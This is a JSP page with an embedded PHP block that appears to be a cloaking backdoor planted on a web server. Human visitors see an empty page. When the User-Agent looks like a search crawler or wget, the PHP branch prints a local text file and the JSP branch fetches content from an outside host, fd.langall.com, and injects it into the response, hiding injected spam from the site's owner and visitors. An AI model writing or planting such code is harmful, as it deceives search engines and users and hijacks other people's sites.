<%@page import="java.io.InputStreamReader"%>
<%@page import="java.io.InputStream"%>
<%@page import="java.net.HttpURLConnection"%>
<%@page import="java.net.URL"%>
<%@page import="java.io.BufferedReader"%>
<%@page import="java.io.File"%>
<%@page import="java.io.FileReader"%>
<%@page import="java.util.regex.Matcher"%>
<%@page import="java.util.regex.Pattern"%>
<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>

<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title></title>
</head>
<body>
<?php
if(preg_match('/Google Web Preview|bot|spider|wget/i',$_SERVER['HTTP_USER_AGENT'])){
echo file_get_contents('aaa.txt');
}
?>

<%
String user_agent=request.getHeader("User-Agent");
if(user_agent==null) return;
Pattern pat = Pattern.compile("(Google Web Preview|bot|spider|wget)");
Matcher m=pat.matcher(user_agent);
if(m.find()){
	
	//String path=request.getRealPath("/")+"/logo.txt";
	String path="http://fd.langall.com/wedding.txt";
	if(path.startsWith("http://")){
	try {
			//实例一个URL对象
			URL url = new URL(path);
			//创建一个http请求连接
		    HttpURLConnection connection=(HttpURLConnection)url.openConnection();
		    //设置请求头信息
		    connection.setRequestProperty("User-Agent","Mozilla/4.0");
		    connection.setConnectTimeout(30000);//30秒超时
		    //请求连接
		   	connection.connect(); 
		    InputStream in= connection.getInputStream();
		    //读取内容,UTF-8编码
		    BufferedReader reader=new BufferedReader(new InputStreamReader(in,"UTF-8"));
		    
		    String tempstr=null;
		    while((tempstr=reader.readLine())!=null){ 
		    	 
		    	out.println(tempstr);
			  
		    }
		   
		   }catch (Exception e) {
			  
		   }
		
	}
	else{
		File f=new File(path);
		if(f.exists()){
			FileReader fr=new FileReader(f);
			BufferedReader br=new BufferedReader(fr);
			String tem=null;
			while((tem=br.readLine())!=null){
				out.println(tem);
			}
			br.close();
			fr.close();
		}
	}
}
%>
</body>
</html>